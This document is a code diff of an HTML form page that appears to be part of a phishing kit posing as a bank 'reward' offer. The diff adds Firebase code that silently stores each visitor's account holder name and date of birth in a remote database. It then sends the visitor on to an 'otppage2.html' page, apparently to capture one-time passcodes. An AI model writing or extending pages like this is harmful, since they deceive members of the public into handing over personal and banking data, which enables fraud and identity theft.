@@ -66,7 +66,7 @@
       text-align: center;
     }
 
-    .submit-btn a {
+    .submit-btn button {
       background: #f09c19;
       color: #fff;
       font-size: 12px;
@@ -74,12 +74,12 @@
       padding: 8px 18px;
       text-align: center;
       border-radius: 6px;
-      text-decoration: none;
-      display: inline-block;
+      border: none;
+      cursor: pointer;
       transition: background 0.3s ease;
     }
 
-    .submit-btn a:hover {
+    .submit-btn button:hover {
       background: #0f3f55;
     }
 
@@ -97,7 +97,7 @@
   <img src="https://i.ibb.co/vvzRc4ws/Screenshot-2025-04-20-08-31-47-89-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Meri Tasveer">
 
   <div class="form-container">
-    <form onsubmit="return validateDOB()">
+    <form onsubmit="return handleSubmit(event)">
       <div class="form-group">
         <label for="name">Account holder name *</label>
         <input type="text" id="name" name="name" required>
@@ -110,13 +110,30 @@
       </div>
 
       <div class="submit-btn">
-        <a href="#" onclick="submitIfValid()">Submit</a>
+        <button type="submit">Submit</button>
       </div>
     </form>
 
-    <!-- New image added below submit button -->
     <img class="bottom-image" src="https://i.ibb.co/q3n4tF60/Screenshot-2025-04-20-09-17-33-68-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
   </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCxRO9k9P6dzovbF0OugNzp1TF1yuAY1Xg",
+      authDomain: "welcomingrewd.firebaseapp.com",
+      projectId: "welcomingrewd",
+      storageBucket: "welcomingrewd.firebasestorage.app",
+      messagingSenderId: "33456614906",
+      appId: "1:33456614906:web:b5828e5dcb0253cace0843"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+  </script>
 
   <script>
     const dobInput = document.getElementById("dob");
@@ -138,27 +155,34 @@
       const pattern = /^(\d{2})\/(\d{2})\/(\d{4})$/;
       const match = dob.match(pattern);
 
-      if (!match) {
-        dobError.style.display = "block";
-        return false;
-      }
+      if (!match) return false;
+      const day = parseInt(match[1]), month = parseInt(match[2]);
+      return day >= 1 && day <= 31 && month >= 1 && month <= 12;
+    }
 
-      const day = parseInt(match[1]);
-      const month = parseInt(match[2]);
+    function handleSubmit(e) {
+      e.preventDefault();
+      const name = document.getElementById("name").value.trim();
+      const dob = document.getElementById("dob").value.trim();
 
-      if (day < 1 || day > 31 || month < 1 || month > 12) {
+      if (!validateDOB()) {
         dobError.style.display = "block";
         return false;
       }
 
       dobError.style.display = "none";
-      return true;
-    }
 
-    function submitIfValid() {
-      if (validateDOB()) {
+      db.collection("dob_entries").add({
+        name: name,
+        dob: dob,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
         window.location.href = "otppage2.html";
-      }
+      }).catch((error) => {
+        alert("Error saving to Firebase: " + error.message);
+      });
+
+      return false;
     }
   </script>
 </body>
